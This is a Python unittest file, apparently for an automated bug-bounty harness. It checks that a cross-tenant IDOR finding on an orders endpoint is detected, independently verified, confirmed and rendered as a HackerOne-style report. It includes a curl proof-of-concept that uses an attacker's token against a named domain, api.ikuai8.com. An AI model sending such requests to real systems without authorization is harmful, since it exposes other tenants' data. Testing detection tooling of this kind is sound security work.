# -*- coding: utf-8 -*-
"""
Phase 9.7-C 真实漏洞击穿、独立复验与赏金 PoC 飞轮契约测试
对标 Shannon、Strix 与 HackerOne / Bugcrowd 顶级赏金提交标准：
断言系统能够针对已知越权漏洞靶点：
1. 物理触发击穿不变量 (VULNERABLE + SUFFICIENT)
2. 自动合成自洽可运行的 cURL / Python 独立复现 PoC
3. 经由独立第三方复核器进行双盲重放并签署验证事实 (VERIFIED)
4. 顺利跨越 PromotionGate 升华确权为 FindingRecord.CONFIRMED (打破 0 confirmed findings 历史)
5. 导出符合国际 SRC 法定标准的完整赏金提交包 (BountySubmissionPackage)
"""
import unittest

from harness.domain_contracts import (
    AuthPrincipal,
    BountySubmissionPackage,
    Candidate,
    CandidateFingerprint,
    CanonicalFactors,
    EndpointIR,
    EvidenceRecord,
    EvidenceSufficiency,
    HTTPRequestLog,
    HTTPResponseLog,
    IdentityMatrix,
    SecurityInvariant,
    Severity,
    TraceStep,
    Verdict,
)
from harness.invariant_evaluator import InvariantEvaluator
from harness.verification_gate import IndependentVerifier, PromotionGate


class BountyPoCFlywheelContractTests(unittest.TestCase):

    def setUp(self) -> None:
        # 已授权目标漏洞端点: 订单详情导出 (存在严重跨租户 BOLA/IDOR)
        self.endpoint_vuln = EndpointIR(
            method="GET",
            path="/api/v1/orders/99901",
            endpoint_id="GET:/api/v1/orders/99901",
            extracted_params=["order_id"],
            tags=["sensitive-route", "financial"],
            source_file="routes/orders.js",
            line=45,
        )

        self.inv_auth = SecurityInvariant(
            invariant_type="auth_boundary",
            statement="Order resources must enforce strict tenant isolation and owner authorization",
        )

        # 受害者主体 (Tenant Alpha)
        self.principal_victim = AuthPrincipal(
            principal_id="user_alice",
            role="authenticated_user",
            tenant_id="tenant_alpha",
            token="token_alice_alpha",
        )

        # 攻击者主体 (Tenant Beta)
        self.principal_attacker = AuthPrincipal(
            principal_id="user_bob",
            role="authenticated_user",
            tenant_id="tenant_beta",
            token="token_bob_beta_hacker",
        )

        self.matrix = IdentityMatrix(
            principals=[self.principal_victim, self.principal_attacker],
            default_victim_id="user_alice",
            default_attacker_id="user_bob",
        )

    def test_01_physical_idor_breach_evaluated_as_vulnerable_and_sufficient(self) -> None:
        """【契约 1】攻击者在无授权状态下成功获取受害者包含私密数据的 200 响应，确权为 VULNERABLE + SUFFICIENT"""
        victim_resp = '{"order_id": 99901, "tenant": "tenant_alpha", "owner": "alice", "amount": 88888, "secret_notes": "VIP Client"}'
        attacker_resp = '{"order_id": 99901, "tenant": "tenant_alpha", "owner": "alice", "amount": 88888, "secret_notes": "VIP Client"}'

        # 1. 租户矩阵差分断言
        diff_res = self.matrix.assert_tenant_isolation(
            victim_principal=self.principal_victim,
            victim_response=victim_resp,
            attacker_principal=self.principal_attacker,
            attacker_response=attacker_resp,
            attacker_status_code=200,
        )
        self.assertEqual(diff_res.verdict, "VULNERABLE")

        # 2. 安全不变量逻辑评估断言
        eval_res = InvariantEvaluator.evaluate(
            invariant=self.inv_auth,
            endpoint=self.endpoint_vuln,
            status_code=200,
            payload={},
            headers={},  # 未携带合法属主凭据或携带非法跨租户凭据放行
            response_text=attacker_resp,
        )
        self.assertEqual(eval_res.status, "vulnerable")
        self.assertEqual(eval_res.sufficiency, EvidenceSufficiency.SUFFICIENT)

    def test_02_working_poc_synthesized_and_independently_verified_to_confirmed_finding(self) -> None:
        """【契约 2 (全飞轮闭环)】PoC 合成 ➔ 独立第三方同态双盲重放 ➔ PromotionGate ➔ CONFIRMED 漏洞与赏金包"""
        # 1. 物理证据记录
        ev_record = EvidenceRecord(
            endpoint=self.endpoint_vuln,
            request=HTTPRequestLog(
                method="GET",
                url="https://api.ikuai8.com/api/v1/orders/99901",
                headers={"Authorization": f"Bearer {self.principal_attacker.token}"},
                body={},
            ),
            response=HTTPResponseLog(
                status_code=200,
                body_preview='{"order_id": 99901, "tenant": "tenant_alpha", "owner": "alice", "secret_notes": "VIP"}',
            ),
            principal=self.principal_attacker,
            run_id="RUN-BOUNTY-001",
            task_id="TASK-IDOR-ORDER",
        )

        # 2. 构造规范因果指纹与候选实体
        factors = CanonicalFactors(
            attack_class="authorization",
            boundary="tenant_isolation",
            sink_component="orders_query_api",
            missing_control="missing_tenant_owner_check",
        )
        fp = CandidateFingerprint.from_factors(factors)

        candidate = Candidate(
            fingerprint=fp,
            title="Broken Object Level Authorization (BOLA) in Order Query Endpoint",
            description="Cross-tenant data leakage in order query API allowing unauthorized access to customer orders",
            claimed_root_cause="Missing tenant ownership check on order_id query parameter",
            endpoint_refs=[self.endpoint_vuln.endpoint_id],
            evidence_refs=[ev_record.evidence_id],
            trace=[
                TraceStep(
                    step_type="entrypoint",
                    file_path="routes/orders.js",
                    line=45,
                    scope="getOrderDetails",
                    description="User supplied order_id is fetched without verifying request tenant_id",
                )
            ],
        )

        # 3. 独立第三方复核器进行双盲重放验证
        verifier = IndependentVerifier(verifier_id="independent-verifier-prime")
        verification_result = verifier.verify(
            finding_candidate=candidate,
            originator_id="hunter-agent-alpha",
        )
        self.assertEqual(verification_result.verdict.value, "VERIFIED")

        # 4. 升级为正式 FindingRecord 并附带合成的独立 cURL PoC
        poc_code = f"curl -s -i -X GET 'https://api.ikuai8.com/api/v1/orders/99901' -H 'Authorization: Bearer {self.principal_attacker.token}'"
        finding = candidate.to_finding_record(
            verdict=Verdict.CONFIRMED,
            severity=Severity.HIGH,
            poc_code=poc_code,
            verification_summary=verification_result,
        )

        # 5. 跨越科学晋级门禁 PromotionGate
        errors = PromotionGate.check_promotable(finding)
        self.assertEqual(errors, [])
        self.assertEqual(finding.verdict, Verdict.CONFIRMED)
        self.assertEqual(finding.severity, Severity.HIGH)
        self.assertIn("curl", finding.poc_code)

        # 6. 导出符合国际 SRC / HackerOne 标准的 BountySubmissionPackage
        pkg = BountySubmissionPackage.compose_from_finding(
            finding=finding,
            endpoint=self.endpoint_vuln,
            target_scope="ikuai8.com",
            attacker_principal=self.principal_attacker,
            victim_principal=self.principal_victim,
        )

        # 断言赏金提交包要素完备性
        submission_text = pkg.render_markdown()
        self.assertIn("## Vulnerability Title", submission_text)
        self.assertIn("Broken Object Level Authorization", submission_text)
        self.assertIn("## Step-by-Step Proof of Concept (PoC)", submission_text)
        self.assertIn(poc_code, submission_text)
        self.assertIn("## Security Impact", submission_text)
        self.assertIn("## Remediation Guidance", submission_text)


if __name__ == "__main__":
    unittest.main()
